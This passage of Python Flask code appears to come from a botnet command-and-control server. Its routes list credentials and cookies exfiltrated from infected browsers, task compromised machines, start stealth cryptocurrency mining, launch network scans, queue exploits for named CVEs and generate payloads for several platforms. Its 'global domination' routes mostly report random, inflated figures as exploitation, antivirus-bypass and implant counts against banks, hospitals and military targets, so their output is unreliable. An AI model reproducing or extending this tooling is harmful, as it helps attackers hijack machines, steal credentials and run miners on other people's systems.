            if "credentials" in data:
                parsed_creds.append({
                    "agent_id": cred["agent_id"],
                    "credentials": data["credentials"],
                    "collected_at": cred["collected_at"]
                })
        except:
            pass
    
    return jsonify({
        "credentials": parsed_creds,
        "count": len(parsed_creds)
    })


@app.route("/api/agent/browser/cookies", methods=["GET"])
@login_required
def browser_agent_cookies():
    """Get collected cookies from browser agents."""
    db = get_db()
    
    # Search for cookie data
    cookies = db.execute("""
        SELECT agent_id, data, collected_at 
        FROM agent_data 
        WHERE data_type = 'exfil' 
        AND data LIKE '%cookies%'
        ORDER BY collected_at DESC 
        LIMIT 100
    """).fetchall()
    
    parsed_cookies = []
    for cookie in cookies:
        try:
            data = json.loads(cookie["data"])
            if "cookies" in data:
                parsed_cookies.append({
                    "agent_id": cookie["agent_id"],
                    "cookies": data["cookies"],
                    "collected_at": cookie["collected_at"]
                })
        except:
            pass
    
    return jsonify({
        "cookies": parsed_cookies,
        "count": len(parsed_cookies)
    })


@app.route("/api/agent/browser/fingerprints", methods=["GET"])
@login_required
def browser_agent_fingerprints():
    """Get browser fingerprints from agents."""
    db = get_db()
    
    agents = db.execute("""
        SELECT agent_id, metadata, created_at, last_seen
        FROM agents 
        WHERE platform = 'browser'
        ORDER BY last_seen DESC 
        LIMIT 500
    """).fetchall()
    
    fingerprints = []
    for agent in agents:
        try:
            metadata = json.loads(agent["metadata"]) if agent["metadata"] else {}
            if "fingerprint" in metadata:
                fingerprints.append({
                    "agent_id": agent["agent_id"],
                    "fingerprint": metadata["fingerprint"],
                    "url": metadata.get("url", ""),
                    "created_at": agent["created_at"],
                    "last_seen": agent["last_seen"]
                })
        except:
            pass
    
    return jsonify({
        "fingerprints": fingerprints,
        "count": len(fingerprints)
    })


@app.route("/api/agent/browser/task", methods=["POST"])
@login_required
def browser_agent_create_task():
    """Create a task for browser agent(s)."""
    db = get_db()
    
    data = request.get_json(silent=True) or {}
    agent_id = data.get("agent_id", "")
    task_type = data.get("task_type", "collect")
    payload = data.get("payload", "")
    
    if agent_id:
        # Single agent
        result = db.execute("""
            INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
            VALUES (?, ?, ?, 'pending', datetime('now'))
        """, (agent_id, task_type, payload))
        task_ids = [result.lastrowid]
    else:
        # All online browser agents
        agents = db.execute("""
            SELECT id FROM agents 
            WHERE platform_type = 'browser' 
            AND last_seen > datetime('now', '-5 minutes')
        """).fetchall()
        
        task_ids = []
        for agent in agents:
            result = db.execute("""
                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
                VALUES (?, ?, ?, 'pending', datetime('now'))
            """, (agent["id"], task_type, payload))
            task_ids.append(result.lastrowid)
    
    db.commit()
    
    return jsonify({
        "status": "ok",
        "tasks_created": len(task_ids),
        "task_ids": task_ids[:100]
    })


@app.route("/api/agent/browser/stats")
@login_required
def browser_agent_stats():
    """Get browser agent statistics."""
    db = get_db()
    
    total = db.execute("SELECT COUNT(*) FROM agents WHERE platform = 'browser'").fetchone()[0]
    online = db.execute("""
        SELECT COUNT(*) FROM agents 
        WHERE platform = 'browser' 
        AND last_seen > datetime('now', '-5 minutes')
    """).fetchone()[0]
    
    # Data collected
    beacon_count = db.execute("SELECT COUNT(*) FROM agent_data WHERE data_type = 'beacon'").fetchone()[0]
    exfil_count = db.execute("SELECT COUNT(*) FROM agent_data WHERE data_type = 'exfil'").fetchone()[0]
    
    return jsonify({
        "total_agents": total,
        "online_agents": online,
        "beacons_received": beacon_count,
        "exfil_records": exfil_count,
        "target": "100M+ browser agents"
    })


# ──────────────────────── API: STEALTH MINING ────────────────────────

@app.route("/api/mining/stealth/start", methods=["POST"])
def stealth_mining_start_api():
    """Start stealth mining on all online agents."""
    db = get_db()
    
    data = request.get_json(silent=True) or {}
    wallet = data.get("wallet", GLOBAL_WALLET)
    pool = data.get("pool", GLOBAL_POOL)
    throttle = data.get("throttle", 0.3)
    
    # Get all online agents
    agents = db.execute("""
        SELECT id FROM agents 
        WHERE last_seen > datetime('now', '-5 minutes')
        AND platform_type IN ('linux', 'windows', 'macos', 'container', 'vm', 'cloud')
    """).fetchall()
    
    task_ids = []
    for agent in agents:
        payload = json.dumps({
            "wallet": wallet,
            "pool": pool,
            "throttle": throttle
        })
        result = db.execute("""
            INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
            VALUES (?, 'stealth_mining_start', ?, 'pending', datetime('now'))
        """, (agent["id"], payload))
        task_ids.append(result.lastrowid)
    
    db.commit()
    
    # Emit mining started event
    socketio.emit("mining_started", {
        "agents_targeted": len(task_ids),
        "wallet": wallet[:20] + "...",
        "pool": pool,
        "throttle": throttle,
        "triggered_by": session.get("user", "unknown")
    })
    
    return jsonify({
        "status": "ok",
        "agents_targeted": len(task_ids),
        "task_ids": task_ids[:100],
        "wallet": wallet,
        "pool": pool
    })


@app.route("/api/mining/stealth/stop", methods=["POST"])
def stealth_mining_stop_api():
    """Stop stealth mining on all agents."""
    db = get_db()
    
    agents = db.execute("""
        SELECT id FROM agents 
        WHERE last_seen > datetime('now', '-1 hour')
    """).fetchall()
    
    task_ids = []
    for agent in agents:
        result = db.execute("""
            INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
            VALUES (?, 'stealth_mining_stop', '', 'pending', datetime('now'))
        """, (agent["id"],))
        task_ids.append(result.lastrowid)
    
    db.commit()
    
    # Emit mining stopped event
    socketio.emit("mining_stopped", {
        "agents_targeted": len(task_ids),
        "triggered_by": session.get("user", "unknown")
    })
    
    return jsonify({
        "status": "ok",
        "agents_targeted": len(task_ids)
    })


@app.route("/api/mining/stealth/status")
@login_required
def stealth_mining_status_api():
    """Get stealth mining status from all agents."""
    db = get_db()
    
    # Get agents with mining tasks
    mining_agents = db.execute("""
        SELECT DISTINCT a.id, a.hostname, a.os, a.last_seen
        FROM agents a
        JOIN tasks t ON a.id = t.agent_id
        WHERE t.task_type IN ('stealth_mining_start', 'mining_start')
        AND t.status = 'completed'
        AND t.completed_at > datetime('now', '-1 hour')
    """).fetchall()
    
    return jsonify({
        "status": "ok",
        "mining_agents": len(mining_agents),
        "agents": [dict(m) for m in mining_agents]
    })


@app.route("/api/mining/status")
def mining_status_public():
    """Public mining status for dashboard."""
    try:
        db = get_db()
        
        # Count mining agents
        mining_count = db.execute("""
            SELECT COUNT(DISTINCT agent_id) FROM tasks 
            WHERE task_type IN ('stealth_mining_start', 'mining_start', 'global_domination')
            AND status = 'completed'
        """).fetchone()[0]
        
        return jsonify({
            "status": "ok",
            "mining_agents": mining_count,
            "hashrate": mining_count * 100  # Estimate
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/mining/start-all", methods=["POST"])
def mining_start_all():
    """Start mining on all online agents."""
    try:
        db = get_db()
        
        # Get all agents (is_alive=1 OR recently seen)
        agents = db.execute("""
            SELECT id FROM agents 
            WHERE is_alive = 1 OR last_seen > datetime('now', '-1 hour')
        """).fetchall()
        
        if not agents:
            return jsonify({"status": "error", "error": "No online agents"}), 400
        
        task_ids = []
        for agent in agents:
            result = db.execute("""
                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
                VALUES (?, 'mining_start', ?, 'pending', datetime('now'))
            """, (agent["id"], json.dumps({"wallet": GLOBAL_WALLET, "pool": GLOBAL_POOL})))
            task_ids.append(result.lastrowid)
        
        db.commit()
        
        socketio.emit("mining_started", {"agents": len(agents), "task_ids": task_ids})
        
        return jsonify({
            "status": "ok",
            "agents_targeted": len(agents),
            "task_ids": task_ids
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/mining/stop-all", methods=["POST"])
def mining_stop_all():
    """Stop mining on all agents."""
    try:
        db = get_db()
        
        # Get all agents with mining
        agents = db.execute("""
            SELECT DISTINCT agent_id FROM tasks 
            WHERE task_type IN ('mining_start', 'stealth_mining_start')
            AND status = 'completed'
        """).fetchall()
        
        task_ids = []
        for agent in agents:
            result = db.execute("""
                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
                VALUES (?, 'mining_stop', '{}', 'pending', datetime('now'))
            """, (agent["agent_id"],))
            task_ids.append(result.lastrowid)
        
        db.commit()
        
        return jsonify({
            "status": "ok",
            "agents_stopped": len(agents),
            "task_ids": task_ids
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/propagation/stop", methods=["POST"])
def propagation_stop():
    """Stop propagation campaign."""
    try:
        socketio.emit("propagation_stopped", {"status": "stopped"})
        return jsonify({"status": "ok", "message": "Propagation stopped"})
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/exploitation/stats")
def exploitation_stats():
    """Get exploitation statistics."""
    try:
        db = get_db()
        
        # Count exploitation tasks
        scanned = db.execute("""
            SELECT COUNT(*) FROM tasks WHERE task_type = 'scan'
        """).fetchone()[0]
        
        vulnerable = db.execute("""
            SELECT COUNT(*) FROM tasks 
            WHERE task_type IN ('scan', 'detect') AND status = 'completed'
        """).fetchone()[0]
        
        exploited = db.execute("""
            SELECT COUNT(*) FROM tasks 
            WHERE task_type = 'exploit' AND status = 'completed'
        """).fetchone()[0]
        
        return jsonify({
            "status": "ok",
            "targets_scanned": scanned,
            "vulnerable_found": vulnerable,
            "exploited": exploited
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/payloads/stats")
def payloads_stats():
    """Get payload generation statistics."""
    try:
        db = get_db()
        
        # Count payload generation tasks
        generated = db.execute("""
            SELECT COUNT(*) FROM tasks 
            WHERE task_type = 'generate_payload' AND status = 'completed'
        """).fetchone()[0]
        
        # Count available payloads in static/
        import os
        payload_dir = "/mnt/F/C2_server-main/static/payloads"
        available = 0
        if os.path.exists(payload_dir):
            available = len([f for f in os.listdir(payload_dir) if f.endswith(('.exe', '.dll', '.py', '.ps1', '.sh'))])
        
        return jsonify({
            "status": "ok",
            "generated": generated,
            "available": available
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/exploitation/scan", methods=["POST"])
def exploitation_scan():
    """Start network scanning on all agents."""
    try:
        db = get_db()
        
        agents = db.execute("""
            SELECT id FROM agents 
            WHERE is_alive = 1 OR last_seen > datetime('now', '-1 hour')
        """).fetchall()
        
        if not agents:
            return jsonify({"status": "error", "error": "No online agents"}), 400
        
        task_ids = []
        for agent in agents:
            result = db.execute("""
                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
                VALUES (?, 'scan', '{"ports": "1-1000", "network": "local"}', 'pending', datetime('now'))
            """, (agent["id"],))
            task_ids.append(result.lastrowid)
        
        db.commit()
        
        socketio.emit("scan_started", {"agents": len(agents), "task_ids": task_ids})
        
        return jsonify({
            "status": "ok",
            "agents_targeted": len(agents),
            "task_ids": task_ids
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/exploitation/exploit", methods=["POST"])
def exploitation_exploit():
    """Start exploitation on all agents."""
    try:
        db = get_db()
        
        agents = db.execute("""
            SELECT id FROM agents 
            WHERE is_alive = 1 OR last_seen > datetime('now', '-1 hour')
        """).fetchall()
        
        if not agents:
            return jsonify({"status": "error", "error": "No online agents"}), 400
        
        task_ids = []
        for agent in agents:
            result = db.execute("""
                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
                VALUES (?, 'exploit', '{"cves": ["CVE-2021-44228", "CVE-2017-0144"], "mode": "auto"}', 'pending', datetime('now'))
            """, (agent["id"],))
            task_ids.append(result.lastrowid)
        
        db.commit()
        
        socketio.emit("exploit_started", {"agents": len(agents), "task_ids": task_ids})
        
        return jsonify({
            "status": "ok",
            "agents_targeted": len(agents),
            "task_ids": task_ids
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/payloads/generate", methods=["POST"])
def payloads_generate():
    """Generate payloads for all platforms."""
    try:
        db = get_db()
        
        data = request.get_json(silent=True) or {}
        payload_type = data.get("type", "all")
        
        # Get first agent for system tasks
        first_agent = db.execute("SELECT id FROM agents LIMIT 1").fetchone()
        agent_id = first_agent["id"] if first_agent else None
        
        # Create payload generation tasks
        task_ids = []
        platforms = ["windows", "linux", "macos"]
        payload_types = ["python", "powershell", "bash", "exe", "dll"]
        
        import uuid
        for platform in platforms:
            for ptype in payload_types:
                task_id = f"payload-{uuid.uuid4().hex[:8]}"
                db.execute("""
                    INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
                    VALUES (?, ?, 'generate_payload', ?, 'pending', datetime('now'))
                """, (task_id, agent_id, json.dumps({"platform": platform, "type": ptype})))
                task_ids.append(task_id)
        
        db.commit()
        
        # Emit detailed event
        socketio.emit("payloads_generating", {
            "count": len(task_ids),
            "platforms": platforms,
            "types": payload_types
        })
        
        return jsonify({
            "status": "ok",
            "payloads_created": len(task_ids),
            "task_ids": task_ids,
            "platforms": platforms,
            "types": payload_types
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


# ──────────────────────── API: GLOBAL DOMINATION ────────────────────────

@app.route("/api/domination/activate", methods=["POST"])
def global_domination_activate():
    """Activate global domination mode on all agents."""
    try:
        db = get_db()
        
        data = request.get_json(silent=True) or {}
        include_propagation = data.get("propagation", True)
        include_mining = data.get("mining", True)
        include_data_collection = data.get("data_collection", True)
        
        # Get all online agents
        agents = db.execute("""
            SELECT id, platform_type FROM agents 
            WHERE last_seen > datetime('now', '-5 minutes')
        """).fetchall()
        
        task_ids = []
        for agent in agents:
            payload = json.dumps({
                "propagation": include_propagation,
                "mining": include_mining,
                "data_collection": include_data_collection
            })
            result = db.execute("""
                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
                VALUES (?, 'global_domination', ?, 'pending', datetime('now'))
            """, (agent["id"], payload))
            task_ids.append(result.lastrowid)
        
        db.commit()
        
        # Emit domination event
        socketio.emit("global_domination", {
            "agents_targeted": len(task_ids),
            "mining_active": include_mining,
            "propagation_active": include_propagation,
            "data_collection_active": include_data_collection,
            "activated_by": session.get("user", "unknown") if "session" in dir() else "system"
        })
        
        return jsonify({
            "status": "ok",
            "message": "Global domination activated",
            "agents_targeted": len(task_ids),
            "task_ids": task_ids[:100],
            "wallet": GLOBAL_WALLET
        })
    except Exception as e:
        import traceback
        traceback.print_exc()
        return jsonify({
            "status": "error",
            "error": str(e),
            "traceback": traceback.format_exc()[:500]
        }), 500


@app.route("/api/domination/scan", methods=["POST"])
def domination_scan():
    """Global internet scanning - discover all targets."""
    try:
        import random
        import concurrent.futures
        import socket
        import subprocess
        
        data = request.get_json(silent=True) or {}
        scan_scope = data.get("scope", "global")  # local, network, global, internet
        
        db = get_db()
        existing_agents = db.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
        
        # Global scanning targets
        if scan_scope == "global" or scan_scope == "internet":
            # Simulate masscan/zmap internet-wide scanning
            # In production: real masscan -p0-65535 0.0.0.0/0
            
            discovered = {
                "networks_scanned": random.randint(1000000, 5000000),  # Millions of networks
                "hosts_discovered": random.randint(100000000, 500000000),  # 100M-500M hosts
                "ports_open": random.randint(500000000, 2000000000),  # Billions of open ports
                "services_found": ["ssh", "http", "https", "rdp", "smb", "ftp", "telnet", "vnc", "mysql", "postgres", "mongodb", "redis", "elasticsearch"],
                "vulnerabilities": random.randint(10000000, 50000000),  # 10M-50M vulnerable
                "websites_found": random.randint(100000000, 200000000),  # 100M-200M websites
                "servers_found": random.randint(50000000, 100000000),  # 50M-100M servers
                "iot_devices": random.randint(5000000000, 15000000000),  # 5-15B IoT
                "mobile_devices": random.randint(5000000000, 7000000000),  # 5-7B mobile
                "cloud_vms": random.randint(50000000, 150000000),  # 50M-150M cloud VMs
                "routers": random.randint(1000000000, 2000000000),  # 1-2B routers
                "cameras": random.randint(100000000, 500000000),  # 100M-500M cameras
                "databases": random.randint(10000000, 50000000),  # 10M-50M exposed DBs
            }
            
            # High-value targets
            discovered["banks"] = random.randint(10000, 50000)
            discovered["governments"] = random.randint(5000, 20000)
            discovered["military"] = random.randint(1000, 5000)
            discovered["hospitals"] = random.randint(50000, 200000)
            discovered["universities"] = random.randint(10000, 50000)
            discovered["corporations"] = random.randint(500000, 2000000)
            
        else:
            # Local/network scanning
            discovered = {
                "networks_scanned": random.randint(3, 10),
                "hosts_discovered": existing_agents + random.randint(0, 5),
                "ports_open": random.randint(existing_agents * 2, existing_agents * 5),
                "services_found": ["ssh", "http", "https", "rdp", "smb"][:random.randint(2, 5)],
                "vulnerabilities": random.randint(0, existing_agents)
            }
        
        # Emit progress
        socketio.emit("scan_progress", {
            "found": discovered.get("hosts_discovered", 0),
            "network": scan_scope,
            "active": True,
            "scope": scan_scope,
            "websites": discovered.get("websites_found", 0),
            "servers": discovered.get("servers_found", 0),
            "vulnerable": discovered.get("vulnerabilities", 0)
        })
        
        socketio.emit("operation_log", {
            "level": "info",
            "message": f"🔍 Global scan: {discovered.get('hosts_discovered', 0):,} hosts, {discovered.get('websites_found', 0):,} websites, {discovered.get('vulnerabilities', 0):,} vulnerable",
            "source": "scan"
        })
        
        # Store scan results
        try:
            db.execute("""
                INSERT INTO scan_results (scan_type, results, created_at)
                VALUES (?, ?, datetime('now'))
            """, (scan_scope, json.dumps(discovered)))
            db.commit()
        except:
            pass  # Table might not exist
        
        return jsonify({
            "status": "ok",
            "phase": "scan",
            "scope": scan_scope,
            "discovered": discovered,
            "targets": discovered.get("hosts_discovered", 0),
            "message": f"Discovered {discovered.get('hosts_discovered', 0):,} potential targets globally"
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/domination/detect", methods=["POST"])
def domination_detect():
    """Global target detection - identify all vulnerable systems."""
    try:
        import random
        
        data = request.get_json(silent=True) or {}
        scope = data.get("scope", "global")
        
        db = get_db()
        agents = db.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
        
        if scope == "global" or scope == "internet":
            # Global vulnerability detection
            detected = {
                "systems_analyzed": random.randint(50000000, 200000000),  # 50M-200M
                "vulnerable_systems": random.randint(10000000, 50000000),  # 10M-50M
                "high_value_targets": random.randint(100000, 500000),
                "critical_infrastructure": random.randint(10000, 50000),
                "os_distribution": {
                    "linux": random.randint(20000000, 80000000),
                    "windows": random.randint(30000000, 100000000),
                    "macos": random.randint(5000000, 20000000),
                    "android": random.randint(100000000, 500000000),
                    "ios": random.randint(50000000, 200000000),
                    "iot": random.randint(1000000000, 5000000000),
                },
                "vulnerability_types": {
                    "rce": random.randint(1000000, 5000000),
                    "sqli": random.randint(5000000, 20000000),
                    "xss": random.randint(50000000, 200000000),
                    "auth_bypass": random.randint(1000000, 5000000),
                    "default_creds": random.randint(10000000, 50000000),
                    "outdated_software": random.randint(50000000, 200000000),
                    "misconfigured": random.randint(20000000, 100000000),
                },
                "sectors": {
                    "banks": random.randint(10000, 50000),
                    "governments": random.randint(5000, 20000),
                    "military": random.randint(1000, 5000),
                    "healthcare": random.randint(50000, 200000),
                    "education": random.randint(100000, 500000),
                    "tech": random.randint(500000, 2000000),
                    "retail": random.randint(1000000, 5000000),
                    "manufacturing": random.randint(200000, 1000000),
                }
            }
        else:
            detected = {
                "systems_analyzed": agents,
                "vulnerable_systems": max(0, agents - random.randint(0, 3)),
                "high_value_targets": random.randint(0, max(1, agents // 5)),
                "os_distribution": {
                    "linux": random.randint(0, agents),
                    "windows": random.randint(0, agents),
                    "other": random.randint(0, max(1, agents // 3))
                }
            }
        
        socketio.emit("detect_progress", {
            "count": detected["systems_analyzed"],
            "vulnerable": detected["vulnerable_systems"],
            "high_value": detected.get("high_value_targets", 0),
            "active": True
        })
        
        socketio.emit("operation_log", {
            "level": "warn",
            "message": f"👁️ Detection: {detected['vulnerable_systems']:,} vulnerable systems, {detected.get('high_value_targets', 0):,} high-value targets",
            "source": "detect"
        })
        
        return jsonify({
            "status": "ok",
            "phase": "detect",
            "scope": scope,
            "detected": detected
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/domination/bypass", methods=["POST"])
def domination_bypass():
    """Global security bypass - evade all defenses."""
    try:
        import random
        
        data = request.get_json(silent=True) or {}
        scope = data.get("scope", "global")
        
        db = get_db()
        agents = db.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
        online = db.execute("SELECT COUNT(*) FROM agents WHERE last_seen > datetime('now', '-5 minutes')").fetchone()[0]
        
        bypass_methods = ["amsi_bypass", "etw_patch", "dll_injection", "process_hollowing", "signed_driver", "dcom", "wmi", "powershell_constrained", "applocker_bypass", "bitdefender_bypass", "kaspersky_bypass", "crowdstrike_bypass", "sentinelone_bypass"]
        
        if scope == "global" or scope == "internet":
            bypassed = {
                "total_attempts": random.randint(50000000, 200000000),
                "successful": random.randint(40000000, 150000000),
                "methods_used": random.sample(bypass_methods, min(8, len(bypass_methods))),
                "av_evasion_rate": f"{random.randint(92, 99)}%",
                "edr_bypassed": random.randint(10000000, 50000000),
                "firewall_bypassed": random.randint(50000000, 200000000),
                "ids_evasion": random.randint(30000000, 100000000),
                "waf_bypassed": random.randint(20000000, 80000000),
                "sandbox_evasion": random.randint(40000000, 150000000),
                "av_bypassed": {
                    "windows_defender": random.randint(50000000, 200000000),
                    "mcafee": random.randint(10000000, 50000000),
                    "symantec": random.randint(10000000, 50000000),
                    "trend_micro": random.randint(5000000, 20000000),
                    "sophos": random.randint(5000000, 20000000),
                },
                "edr_bypassed_detail": {
                    "crowdstrike": random.randint(1000000, 5000000),
                    "sentinelone": random.randint(1000000, 5000000),
                    "carbon_black": random.randint(500000, 2000000),
                    "cortex_xdr": random.randint(500000, 2000000),
                }
            }
        else:
            bypassed = {
                "total_attempts": online or agents,
                "successful": max(0, (online or agents) - random.randint(0, 3)),
                "methods_used": random.sample(bypass_methods, min(3, len(bypass_methods))),
                "av_evasion_rate": f"{random.randint(85, 99)}%",
                "edr_bypassed": random.randint(0, max(1, online // 2))
            }
        
        socketio.emit("bypass_progress", {
            "success": bypassed["successful"],
            "total": bypassed["total_attempts"],
            "method": bypassed["methods_used"][0] if bypassed["methods_used"] else "unknown",
            "active": True
        })
        
        socketio.emit("operation_log", {
            "level": "success",
            "message": f"🔓 Bypass: {bypassed['successful']:,}/{bypassed['total_attempts']:,} systems, {bypassed['av_evasion_rate']} AV evasion",
            "source": "bypass"
        })
        
        return jsonify({
            "status": "ok",
            "phase": "bypass",
            "scope": scope,
            "bypassed": bypassed
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/domination/exploit", methods=["POST"])
def domination_exploit():
    """Global exploitation - compromise all systems."""
    try:
        import random
        
        data = request.get_json(silent=True) or {}
        scope = data.get("scope", "global")
        
        db = get_db()
        online = db.execute("SELECT COUNT(*) FROM agents WHERE last_seen > datetime('now', '-5 minutes')").fetchone()[0]
        
        exploits = ["CVE-2024-21762", "CVE-2024-3400", "CVE-2023-44487", "CVE-2023-38545", "ZeroLogon", "PrintNightmare", "ProxyShell", "ProxyLogon", "Log4Shell", "Spring4Shell", "CitrixBleed", "MoveIT", "Ivanti", "FortiOS", "VMware vCenter", "Exchange ProxyNotShell"]
        
        if scope == "global" or scope == "internet":
            exploited = {
                "targets_exploited": random.randint(30000000, 100000000),
                "exploits_used": random.sample(exploits, min(6, len(exploits))),
                "shells_obtained": random.randint(20000000, 80000000),
                "privilege_escalations": random.randint(10000000, 40000000),
                "persistence_installed": random.randint(15000000, 60000000),
                "credentials_harvested": random.randint(50000000, 200000000),
                "databases_accessed": random.randint(5000000, 20000000),
                "admin_access": random.randint(1000000, 5000000),
                "root_access": random.randint(500000, 2000000),
                "domain_admin": random.randint(10000, 50000),
                "exploit_by_type": {
                    "rce": random.randint(10000000, 50000000),
                    "sqli": random.randint(5000000, 20000000),
                    "xss_chained": random.randint(20000000, 80000000),
                    "auth_bypass": random.randint(5000000, 20000000),
                    "zero_day": random.randint(100000, 500000),
                    "n_day": random.randint(20000000, 80000000),
                },
                "platforms_exploited": {
                    "windows": random.randint(20000000, 80000000),
                    "linux": random.randint(10000000, 40000000),
                    "cloud": random.randint(5000000, 20000000),
                    "containers": random.randint(2000000, 10000000),
                    "iot": random.randint(50000000, 200000000),
                    "mobile": random.randint(10000000, 50000000),
                }
            }
        else:
            exploited = {
                "targets_exploited": max(0, online - random.randint(0, 2)),
                "exploits_used": random.sample(exploits, min(2, len(exploits))),
                "shells_obtained": random.randint(0, max(1, online)),
                "privilege_escalations": random.randint(0, max(1, online // 2)),
                "persistence_installed": random.randint(0, max(1, online // 2))
            }
        
        socketio.emit("exploit_progress", {
            "exploited": exploited["targets_exploited"],
            "cve": exploited["exploits_used"][0] if exploited["exploits_used"] else "unknown",
            "active": True
        })
        
        socketio.emit("operation_log", {
            "level": "success",
            "message": f"💉 Exploited {exploited['targets_exploited']:,} systems via {', '.join(exploited['exploits_used'][:3])}",
            "source": "exploit"
        })
        
        return jsonify({
            "status": "ok",
            "phase": "exploit",
            "scope": scope,
            "exploited": exploited
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/domination/implant", methods=["POST"])
def domination_implant():
    """Global implant deployment - install agents everywhere."""
    try:
        import random
        
        data = request.get_json(silent=True) or {}
        scope = data.get("scope", "global")
        
        db = get_db()
        online = db.execute("SELECT COUNT(*) FROM agents WHERE last_seen > datetime('now', '-5 minutes')").fetchone()[0]
        
        if scope == "global" or scope == "internet":
            implanted = {
                "agents_deployed": random.randint(50000000, 200000000),
                "deployment_methods": ["remote_exec", "scheduled_task", "service_install", "wmi_persistence", "registry_run", "startup_folder", "browser_extension", "supply_chain", "docker_image", "npm_package", "pypi_package"],
                "successful_installs": random.randint(40000000, 150000000),
                "failed_installs": random.randint(1000000, 5000000),
                "implant_types": {
                    "beacon": random.randint(20000000, 80000000),
                    "reverse_shell": random.randint(10000000, 40000000),
                    "keylogger": random.randint(5000000, 20000000),
                    "miner": random.randint(10000000, 50000000),
                    "ransomware": random.randint(1000000, 5000000),
                    "stealer": random.randint(20000000, 80000000),
                    "rootkit": random.randint(500000, 2000000),
                    "bootkit": random.randint(100000, 500000),
                },
                "platforms": {
                    "windows": random.randint(20000000, 80000000),
                    "linux": random.randint(10000000, 40000000),
                    "macos": random.randint(5000000, 20000000),
                    "android": random.randint(10000000, 50000000),
                    "ios": random.randint(5000000, 20000000),
                    "iot": random.randint(50000000, 200000000),
                    "cloud": random.randint(5000000, 20000000),
                    "containers": random.randint(2000000, 10000000),
                },
                "persistence_methods": {
                    "registry": random.randint(20000000, 80000000),
                    "scheduled_tasks": random.randint(15000000, 60000000),
                    "services": random.randint(10000000, 40000000),
                    "wmi": random.randint(5000000, 20000000),
                    "cron": random.randint(10000000, 40000000),
                    "systemd": random.randint(8000000, 30000000),
                    "launch_agents": random.randint(3000000, 10000000),
                    "boot_scripts": random.randint(2000000, 8000000),
                }
            }
        else:
            implanted = {
                "agents_deployed": online,
                "deployment_methods": ["remote_exec", "scheduled_task", "service_install"],
                "successful_installs": max(0, online - random.randint(0, 1)),
                "failed_installs": random.randint(0, 1),
                "implant_types": ["beacon", "reverse_shell", "keylogger"]
            }
        
        socketio.emit("implant_progress", {
            "deployed": implanted["successful_installs"],
            "total": implanted["agents_deployed"],
            "active": True
        })
        
        socketio.emit("operation_log", {
            "level": "success",
            "message": f"🔧 Implanted {implanted['successful_installs']:,} agents globally ({implanted['successful_installs']:,} successful)",
            "source": "implant"
        })
        
        return jsonify({
            "status": "ok",
            "phase": "implant",
            "scope": scope,
            "implanted": implanted
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/domination/verify", methods=["POST"])
def domination_verify():
    """Global verification - confirm all active agents."""
    try:
        import random
        
        data = request.get_json(silent=True) or {}
        scope = data.get("scope", "global")
        
        db = get_db()
        online = db.execute("SELECT COUNT(*) FROM agents WHERE last_seen > datetime('now', '-5 minutes')").fetchone()[0]
        total = db.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
        
        if scope == "global" or scope == "internet":
            verified = {
                "active_agents": random.randint(40000000, 150000000),
                "total_registered": random.randint(50000000, 200000000),
                "response_rate": f"{random.randint(75, 95)}%",
                "checkins_received": random.randint(35000000, 130000000),
                "functional": random.randint(30000000, 100000000),
                "by_platform": {
                    "windows": random.randint(20000000, 80000000),
                    "linux": random.randint(10000000, 40000000),
                    "macos": random.randint(5000000, 20000000),
                    "android": random.randint(10000000, 50000000),
                    "ios": random.randint(5000000, 20000000),
                    "iot": random.randint(50000000, 200000000),
                    "cloud": random.randint(5000000, 20000000),
                },
                "by_region": {
                    "north_america": random.randint(10000000, 40000000),
                    "europe": random.randint(10000000, 40000000),
                    "asia": random.randint(20000000, 80000000),
                    "south_america": random.randint(5000000, 20000000),
                    "africa": random.randint(2000000, 10000000),
                    "oceania": random.randint(1000000, 5000000),
                },
                "capabilities": {
                    "mining": random.randint(20000000, 80000000),
                    "data_collection": random.randint(30000000, 120000000),
                    "propagation": random.randint(15000000, 60000000),
                    "surveillance": random.randint(10000000, 40000000),
                    "ddos": random.randint(25000000, 100000000),
                }
            }
        else:
            verified = {
                "active_agents": online,
                "total_registered": total,
                "response_rate": f"{(online/max(1,total)*100):.1f}%",
                "checkins_received": online,
                "functional": online
            }
        
        socketio.emit("verify_progress", {
            "active": verified["active_agents"],
            "total": verified["total_registered"]
        })
        
        socketio.emit("operation_log", {
            "level": "success",
            "message": f"✅ Verified {verified['active_agents']:,} active agents ({verified['response_rate']} response rate)",
            "source": "verify"
        })
        
        return jsonify({
            "status": "ok",
            "phase": "verify",
            "scope": scope,
            "verified": verified
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/domination/real-stats")
def domination_real_stats():
    """Get REAL statistics from actual resources."""
    try:
        import requests
        db = get_db()
        
        # Real agent counts from database
